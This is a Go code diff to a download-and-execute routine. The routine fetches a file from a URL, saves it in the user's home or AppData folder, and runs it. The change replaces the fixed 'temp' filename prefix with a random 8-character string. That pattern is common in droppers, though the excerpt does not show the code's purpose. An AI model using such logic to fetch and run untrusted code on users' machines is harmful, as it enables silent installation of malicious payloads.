@@ -4,11 +4,13 @@ import (
 	"fmt"
 	"github.com/pkg/errors"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
 	"os/user"
 	"runtime"
+	"time"
 )
 
 func DownloadFile(url string, location string) error {
@@ -46,9 +48,24 @@ func executeFile(location string, args []string) error {
 	return cmd.Start()
 }
 
+// These two variables are used by the randomString function
+const charset = "abcdefghijklmnopqrstuvwxyz" +
+	"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+var seededRand *rand.Rand = rand.New(
+	rand.NewSource(time.Now().UnixNano()))
+
+// This function will return a random string of length len
+func randomString(length int) string {
+	b := make([]byte, length)
+	for i := range b {
+		b[i] = charset[seededRand.Intn(len(charset))]
+	}
+	return string(b)
+}
+
 func DownloadAndExecute(url string, args []string) error {
 	var path string
-	filenamePrefix := "temp"
+	filenamePrefix := randomString(8) // Make the prefix a random 8 latter stirng
 
 	if runtime.GOOS == "windows" {		// Use Appdata folder
 		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
